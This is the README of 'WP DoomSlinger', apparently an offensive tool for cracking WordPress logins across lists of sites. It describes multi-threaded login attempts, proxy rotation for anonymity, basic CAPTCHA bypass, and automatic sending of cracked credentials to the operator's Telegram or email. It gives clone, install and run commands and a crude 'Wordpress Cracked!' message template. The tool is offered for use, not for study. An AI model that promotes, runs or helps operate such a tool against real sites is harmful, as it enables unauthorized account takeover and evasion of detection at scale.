WP DoomSlinger

WP DoomSlinger is a powerful WordPress brute-force tool designed to crack WordPress login credentials with multi-threaded precision. With proxy rotation, CAPTCHA detection, and customizable retries, it's an advanced yet user-friendly solution for pentesters and security enthusiasts alike.
Features

    🔥 Multi-threaded login attempts
    🔐 Proxy rotation support for anonymity
    🧩 CAPTCHA detection and bypass (basic)
    📊 Success and failure visual summary
    📩 Email and Telegram notifications on successful cracks

Usage 🚀

     Clone the repository: 


```git clone https://github.com/yourusername/WP-DoomSlinger.git```
```cd WP-DoomSlinger```

Install dependencies:

```pip install -r requirements.txt```

Run the tool:

    python doom_slinger.py --list path/to/your/credentials.txt --threads 50 --proxy --notify

Once cracked, a successful login will send the login details to your TG account in this format:


Deeb Doob MF, Wordpress Cracked!

Site: https://example.com
Username: admin
Password: password123

Arguments 

    --list: Required. Path to the list of WordPress sites with credentials in the format site#username@password.
    --threads: Optional. Number of threads to use (default: 50).
    --retries: Optional. Number of retries per login attempt (default: 3).
    --proxy: Optional. Enable proxy rotation.
    --notify: Optional. Send email/Telegram notifications on success.

Visual Summary 

The tool provides a pie chart showing the percentage of successful and failed login attempts for each session:

Requirements

    Python 3.x
    requests, tqdm, colorama, beautifulsoup4, matplotlib
